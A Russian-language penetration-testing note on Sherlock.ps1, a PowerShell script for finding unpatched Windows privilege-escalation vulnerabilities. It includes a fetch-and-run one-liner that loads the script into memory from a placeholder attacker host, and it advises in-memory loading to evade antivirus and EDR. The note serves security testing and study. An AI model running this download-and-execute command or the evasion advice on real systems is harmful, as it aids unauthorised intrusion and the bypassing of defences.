**Sherlock.ps1** — PowerShell-скрипт для **локального повышения привилегий на Windows**.  
Проверяет систему на наличие непропатченных уязвимостей, которые можно эксплуатировать для получения `SYSTEM`.

> **Аналог:** заменён более новым [Watson](https://github.com/rasta-mouse/Watson), но Sherlock до сих пор актуален на старых системах (Win 7 / Server 2008–2012).

## Для чего используется

- Быстрая проверка системы на уязвимые привилегии (после получения обычного пользователя)
- Поиск непропатченных kernel exploits
- Выявление конкретных CVE, применимых к текущей ОС
- Работает без интернета и без дополнительных зависимостей

## Как работает

1. Проверяет версию ОС и список установленных KB-патчей
2. Сравнивает с базой известных уязвимостей
3. Выводит список уязвимостей со статусом `Vulnerable` / `Not Vulnerable`

## Эксплуатация

### Загрузка и запуск в памяти (без записи на диск) **ПРЕДПОЧТИТЕЛЬНЕЕ**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Sherlock.ps1')
Find-AllVulns
```

### Импорт и запуск (если есть доступ к диску)

```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```


> `Appears Vulnerable` — цель потенциально уязвима, требует проверки вручную.  
> `Not Vulnerable` — патч установлен.

## Альтернативы

| Инструмент           | Особенности                                                       |
| -------------------- | ----------------------------------------------------------------- |
| **Watson**           | Современная замена Sherlock, .NET, поддерживает Win10/Server 2019 |
| **WinPEAS**          | Комплексный PrivEsc-перечислитель (гораздо шире)                  |
| **Seatbelt**         | C#, глубокая проверка конфигурации системы                        |
| **PrivescCheck.ps1** | PowerShell, актуальный аналог без .NET-зависимостей               |

## Важные замечания

- Sherlock поддерживает только **Windows 7 / 8 / Server 2008–2012** — на Win10+ использовать Watson
- Статус `Appears Vulnerable` не гарантирует успешную эксплуатацию — нужна ручная проверка
- Легко детектируется AV/EDR при запуске с диска — предпочтительна загрузка в память
- Репозиторий заброшен с 2017 года, но скрипт работает на старых системах без изменений
